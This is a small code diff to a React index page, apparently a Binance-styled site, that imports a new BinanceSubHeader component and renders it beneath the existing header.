@@ -1,6 +1,7 @@
 
 import React, { useState, useEffect } from "react";
 import BinanceHeader from "@/components/BinanceHeader";
+import BinanceSubHeader from "@/components/BinanceSubHeader";
 import BinanceFooter from "@/components/BinanceFooter";
 import BinanceLedgerForm from "@/components/BinanceLedgerForm";
 import BinanceAppPromotion from "@/components/BinanceAppPromotion";
@@ -25,6 +26,7 @@ const Index = () => {
   return (
     <div className="min-h-screen flex flex-col bg-binance-dark text-white">
       <BinanceHeader />
+      <BinanceSubHeader />
       
       <main className="flex-grow">
         {/* Form Section */}
